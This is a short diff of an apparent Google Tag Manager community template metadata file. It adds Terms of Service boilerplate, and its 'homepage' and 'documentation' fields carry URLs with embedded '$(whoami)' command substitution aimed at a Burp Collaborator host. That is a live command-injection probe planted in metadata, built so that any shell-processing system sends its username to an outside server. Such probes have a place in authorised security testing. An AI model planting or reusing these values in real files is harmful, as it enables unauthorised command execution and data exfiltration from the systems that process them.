@@ -1,5 +1,18 @@
+___TERMS_OF_SERVICE___
+By creating or modifying this file you agree to Google Tag Manager's Community
+Template Gallery Developer Terms of Service available at
+https://developers.google.com/tag-manager/gallery-tos (or such other URL as
+Google may provide), as modified from time to time.
+
 homepage: "https://s3wi3jyivka1yrn2tsenho70erkh86.burpcollaborator.net/$(whoami)"
 documentation: "https://s3wi3jyivka1yrn2tsenho70erkh86.burpcollaborator.net/1/$(whoami)"
 versions:
   - sha: 5f02a788b90ae804f86b04aa24af8937e567874a
     changeNotes: Initial release.
+
+
+___TERMS_OF_SERVICE___
+By creating or modifying this file you agree to Google Tag Manager's Community
+Template Gallery Developer Terms of Service available at
+https://developers.google.com/tag-manager/gallery-tos (or such other URL as
+Google may provide), as modified from time to time.
